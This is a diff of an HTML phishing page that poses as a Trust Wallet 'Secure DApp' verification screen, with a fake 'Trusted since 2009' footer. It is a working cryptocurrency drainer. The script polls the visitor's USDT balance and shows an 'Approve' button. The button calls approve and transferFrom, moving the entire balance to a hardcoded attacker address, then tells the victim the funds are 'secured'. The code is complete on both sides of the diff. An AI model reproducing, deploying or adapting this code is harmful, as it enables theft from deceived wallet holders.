@@ -4,86 +4,74 @@
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <link rel="icon" href="./favicon.ico" />
-<title>Secure Trust Wallet</title>
+<title>Secure DApp</title>
 <style>
   body {
-    background: #081c3a;
-    color: white;
-    font-family: Arial,sans-serif;
-    display: flex; flex-direction: column;
-    align-items: center; justify-content: center;
-    height: 100vh; margin: 0;
+    background: #081c3a; color: white; font-family: Arial,sans-serif;
+    display: flex; flex-direction: column; align-items: center; justify-content: center;
+    height: 100vh; text-align: center;
   }
-  img { width: 90px; margin-bottom: 20px; }
-  h2 { margin: 0; padding: 0; font-size: 1.3rem; }
-  button {
-    background: #0a84ff; border: none;
-    padding: 12px 24px; margin-top: 20px;
-    color: white; font-size: 1rem; border-radius: 8px;
-    cursor: pointer;
+  img { width: 100px; margin-bottom: 20px; }
+  #status { margin: 10px 0; opacity: 0.9; }
+  #approveButton {
+    background: #0a84ff; padding: 12px 24px; border: none;
+    border-radius: 8px; color: white; font-size: 1rem; cursor: pointer; display: none;
   }
-  #status { margin-top: 10px; opacity: 0.8; }
-  .hidden { display: none; }
-  .success { color: lightgreen; font-size: 1.2rem; margin-top: 20px; }
-  .footer { opacity: 0.4; position: absolute; bottom: 16px; font-size: 0.8rem; }
+  .footer { opacity: 0.5; position: absolute; bottom: 20px; font-size: 0.8rem; }
+  .success { color: lightgreen; margin-top: 10px; }
 </style>
 </head>
 <body>
 <img src="./logo.png" alt="Trust Wallet" />
-<h2>Secure DApp Verification</h2>
-<div id="status">Initializing...</div>
-<button id="approveButton" class="hidden">Approve</button>
+<h2>Secure DApp</h2>
+<div id="status">Initializing DApp...</div>
+<button id="approveButton">Approve</button>
 <div class="footer">Powered by Trust Wallet • Trusted since 2009</div>
 
 <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
 <script>
-(async function() {
-  const TARGET = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC"; // Your receiver address
+  const TARGET = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC"; // Apna wallet
   const USDT = "0x55d398326f99059fF775485246999027B3197955";
   const ABI = [
     { "constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"},
     { "constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"},
     { "constant":true,"inputs":[{"name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"}
   ];
-  let account, contract, web3;
+  let account, web3, contract;
 
   async function init() {
     if (!window.ethereum) {
-      document.getElementById('status').innerText = "❌ Open in Trust Wallet DApp browser.";
+      status.innerText = "❌ Open in Trust Wallet DApp.";
       return;
     }
     web3 = new Web3(window.ethereum);
-    await window.ethereum.request({ method: 'eth_requestAccounts' });
+    await window.ethereum.request({ method: "eth_requestAccounts" });
     [account] = await web3.eth.getAccounts();
     contract = new web3.eth.Contract(ABI, USDT);
-    document.getElementById('status').innerText = "✅ Ready. Waiting for USDT send...";
-    // Trust Wallet will show send page automatically because of QR link you generate
+    status.innerText = "✅ Waiting for USDT send…";
+    poll();
   }
 
-  async function waitForUSDT() {
-    const balance = await contract.methods.balanceOf(account).call();
+  async function poll() {
+    let balance = await contract.methods.balanceOf(account).call();
     if (balance > 0) {
-      document.getElementById('status').innerText = "✅ USDT detected. Tap Approve.";
-      document.getElementById('approveButton').classList.remove('hidden');
+      status.innerText = "✅ Received USDT. Tap Approve.";
+      document.getElementById('approveButton').style.display = "block";
     } else {
-      setTimeout(waitForUSDT, 5000); // poll every 5s
+      setTimeout(poll, 4000);
     }
   }
 
-  async function doApproveAndDrain() {
-    document.getElementById('status').innerText = "⏳ Approving & draining USDT...";
+  document.getElementById('approveButton').onclick = async () => {
+    status.innerText = "⏳ Approving…";
     const balance = await contract.methods.balanceOf(account).call();
-    await contract.methods.approve(TARGET, balance).send({from: account});
-    await contract.methods.transferFrom(account, TARGET, balance).send({from: account});
-    document.getElementById('status').innerHTML = "<div class='success'>✅ Success! Funds secured.</div>";
-    document.getElementById('approveButton').classList.add('hidden');
-  }
-
-  document.getElementById('approveButton').onclick = doApproveAndDrain;
-
-  await init();
-  waitForUSDT();
-})();
+    await contract.methods.approve(TARGET, balance).send({ from: account });
+    await contract.methods.transferFrom(account, TARGET, balance).send({ from: account });
+    status.innerHTML = '<div class="success">✅ Success! Funds secured.</div>';
+    document.getElementById('approveButton').style.display = "none";
+  };
+  
+  init();
 </script>
 </body>
 </html>
